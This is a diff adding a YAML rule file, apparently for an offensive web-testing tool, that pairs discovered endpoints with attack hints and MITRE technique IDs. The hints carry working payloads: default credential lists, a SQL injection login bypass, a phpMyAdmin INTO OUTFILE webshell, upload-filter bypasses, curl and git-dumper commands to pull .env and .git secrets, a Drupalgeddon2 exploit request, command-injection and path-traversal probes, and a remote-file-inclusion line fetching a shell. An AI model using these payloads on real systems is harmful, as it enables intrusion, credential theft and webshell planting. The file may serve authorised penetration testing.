@@ -1,0 +1,240 @@
+# Web endpoint pattern rules
+# Fires when a specific endpoint pattern is found in web_findings.
+
+rules:
+
+  # -------------------------------------------------------------------------
+  # Admin interfaces
+  # -------------------------------------------------------------------------
+
+  - id: web-admin-panel
+    name: "Admin Panel Discovered"
+    hint: >
+      An admin panel has been found. Try default credentials before anything else:
+      admin:admin, admin:password, admin:123456, root:toor.
+      If login fails, look for version disclosure in page source and check for
+      known CVEs for that application. Inspect the login form for SQLi.
+    confidence: 0.85
+    priority: 1
+    mitre: ["T1078.001", "T1190"]
+    tags: [web, admin, default-creds]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(admin|administrator|wp-admin|cpanel|panel|dashboard)"
+
+  - id: web-phpmyadmin
+    name: "phpMyAdmin Exposed"
+    hint: >
+      phpMyAdmin is accessible. Try default credentials: root (no password),
+      root:root, phpmyadmin:phpmyadmin. A successful login gives full database
+      access and potentially RCE via SQL: SELECT '<?php system($_GET[\"c\"]); ?>'
+      INTO OUTFILE '/var/www/html/shell.php'
+    confidence: 0.90
+    priority: 1
+    mitre: ["T1078.001", "T1505.003"]
+    tags: [web, phpmyadmin, database, rce]
+    conditions:
+      - type: web_endpoint
+        pattern: "/phpmyadmin"
+
+  # -------------------------------------------------------------------------
+  # Login pages
+  # -------------------------------------------------------------------------
+
+  - id: web-login-page
+    name: "Login Page Found"
+    hint: >
+      A login page has been identified. Test in this order:
+      (1) Default credentials for any detected CMS or application.
+      (2) SQL injection: try username ' OR 1=1-- - with any password.
+      (3) Check if the error message leaks whether a username is valid (enumeration).
+      (4) Look for password reset functionality that may be weaker than the login itself.
+    confidence: 0.80
+    priority: 1
+    mitre: ["T1078.001", "T1190"]
+    tags: [web, login, sqli, auth]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(login|signin|auth|logon)"
+
+  # -------------------------------------------------------------------------
+  # File upload
+  # -------------------------------------------------------------------------
+
+  - id: web-upload-endpoint
+    name: "File Upload Endpoint Found"
+    hint: >
+      A file upload endpoint has been found -- this is a prime target for webshell upload.
+      Common bypass techniques: (1) rename shell.php to shell.php5, shell.phtml, shell.pHp.
+      (2) Change Content-Type header to image/jpeg while uploading a PHP file.
+      (3) Add a valid image header (GIF89a;) before your PHP code.
+      (4) Try shell.php%00.jpg to exploit null byte injection on older servers.
+    confidence: 0.88
+    priority: 1
+    mitre: ["T1505.003", "T1190"]
+    tags: [web, upload, webshell, rce]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(upload|uploads|file|files|media|images)/?"
+
+  # -------------------------------------------------------------------------
+  # Sensitive files & directories
+  # -------------------------------------------------------------------------
+
+  - id: web-backup-file
+    name: "Backup or Source File Exposed"
+    hint: >
+      A backup or old file is accessible. Download it immediately:
+      curl -o backup http://<target><endpoint>
+      Backup files frequently contain database credentials, API keys, source code,
+      and configuration details. Look for .bak, .old, .orig, .swp, and ~ suffixes too.
+    confidence: 0.88
+    priority: 1
+    mitre: ["T1552.001", "T1083"]
+    tags: [web, backup, disclosure, credentials]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(backup|bak|old|archive|dump|\\.bak|\\.old|\\.orig)"
+
+  - id: web-git-exposed
+    name: "Git Repository Exposed"
+    hint: >
+      A .git directory is accessible. Dump the entire repository with:
+      git-dumper http://<target>/.git /tmp/repo
+      (Install: pip install git-dumper)
+      The source code may contain hardcoded credentials, API keys, and logic flaws.
+    confidence: 0.95
+    priority: 1
+    mitre: ["T1552.001", "T1083"]
+    tags: [web, git, source-disclosure, credentials]
+    conditions:
+      - type: web_endpoint
+        pattern: "/\\.git"
+
+  - id: web-env-file
+    name: ".env File Exposed"
+    hint: >
+      A .env file is accessible -- this almost always contains credentials.
+      Fetch it: curl http://<target>/.env
+      Look for: DB_PASSWORD, APP_KEY, AWS credentials, API tokens, and SMTP passwords.
+    confidence: 0.95
+    priority: 1
+    mitre: ["T1552.001"]
+    tags: [web, env, credentials, disclosure]
+    conditions:
+      - type: web_endpoint
+        pattern: "/\\.env"
+
+  - id: web-config-exposed
+    name: "Configuration File Accessible"
+    hint: >
+      A configuration file endpoint is accessible. Fetch and examine it carefully.
+      Common sensitive fields: database credentials, secret keys, SMTP passwords,
+      and internal API endpoints. Check for: config.php, web.config, application.properties.
+    confidence: 0.85
+    priority: 1
+    mitre: ["T1552.001"]
+    tags: [web, config, credentials, disclosure]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(config|configuration|settings|web\\.config|application\\.properties)"
+
+  - id: web-swagger-api
+    name: "API Documentation Exposed (Swagger/OpenAPI)"
+    hint: >
+      API documentation is accessible at this endpoint. Browse the API spec to:
+      (1) Enumerate all available endpoints, parameters, and authentication methods.
+      (2) Look for admin-only endpoints that may lack proper authorisation.
+      (3) Test for IDOR by swapping user IDs in API calls.
+      (4) Check if authentication tokens can be obtained without valid credentials.
+    confidence: 0.82
+    priority: 2
+    mitre: ["T1046", "T1087"]
+    tags: [web, api, swagger, idor]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(swagger|api-docs|openapi|redoc)"
+
+  # -------------------------------------------------------------------------
+  # CMS Detection
+  # -------------------------------------------------------------------------
+
+  - id: web-wordpress
+    name: "WordPress Installation Found"
+    hint: >
+      WordPress is detected. Enumerate users and plugins:
+      wpscan --url http://<target> --enumerate u,p,t
+      Common attack paths: (1) Default/weak admin credentials at /wp-login.php.
+      (2) Vulnerable plugins -- check wpscan output for known CVEs.
+      (3) XML-RPC brute force: /xmlrpc.php (if enabled).
+    confidence: 0.88
+    priority: 1
+    mitre: ["T1078.001", "T1190"]
+    tags: [web, wordpress, cms]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(wp-admin|wp-login|wp-content|xmlrpc\\.php)"
+
+  - id: web-drupal
+    name: "Drupal Installation Found"
+    hint: >
+      Drupal is detected. Check the version via /CHANGELOG.txt or /core/CHANGELOG.txt.
+      Drupalgeddon2 (CVE-2018-7600) affects Drupal < 7.58 and 8.x < 8.5.1.
+      Test with: curl http://<target>/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup
+    confidence: 0.85
+    priority: 1
+    mitre: ["T1190"]
+    tags: [web, drupal, cms, drupalgeddon]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(sites/default|modules|themes/bartik|CHANGELOG\\.txt)"
+
+  # -------------------------------------------------------------------------
+  # Dangerous endpoints
+  # -------------------------------------------------------------------------
+
+  - id: web-shell-hint
+    name: "Possible Webshell or Command Execution Endpoint"
+    hint: >
+      An endpoint with a suspicious name suggesting command execution has been found.
+      Request it in your browser or with curl and inspect the response carefully.
+      If it accepts a parameter, test for OS command injection:
+      ?cmd=id, ?exec=whoami, ?c=cat+/etc/passwd
+    confidence: 0.85
+    priority: 1
+    mitre: ["T1059", "T1505.003"]
+    tags: [web, rce, webshell, command-injection]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(shell|cmd|exec|command|terminal|console|run|eval)"
+
+  - id: web-lfi-param
+    name: "Potential LFI Parameter Detected"
+    hint: >
+      An endpoint with a file inclusion parameter pattern has been found.
+      Test for Local File Inclusion: add ?file=../../../../etc/passwd
+      or ?page=../../../../etc/passwd to the URL.
+      For RFI (if allow_url_include is on): ?file=http://your-server/shell.php
+    confidence: 0.78
+    priority: 2
+    mitre: ["T1190", "T1083"]
+    tags: [web, lfi, rfi, inclusion]
+    conditions:
+      - type: web_endpoint
+        pattern: "\\?(file|page|path|include|template|load|read)="
+
+  - id: web-register-page
+    name: "User Registration Page Found"
+    hint: >
+      A user registration endpoint is accessible. Test for:
+      (1) Email/username enumeration via registration error messages.
+      (2) Privilege escalation by registering with a role parameter (mass assignment).
+      (3) Weak validation -- can you register as 'admin@<domain>' or an existing user?
+      (4) No CAPTCHA? Automate account creation to enumerate valid emails.
+    confidence: 0.75
+    priority: 2
+    mitre: ["T1087", "T1078"]
+    tags: [web, registration, auth, account-takeover]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(register|signup|create.?account|new.?user)"
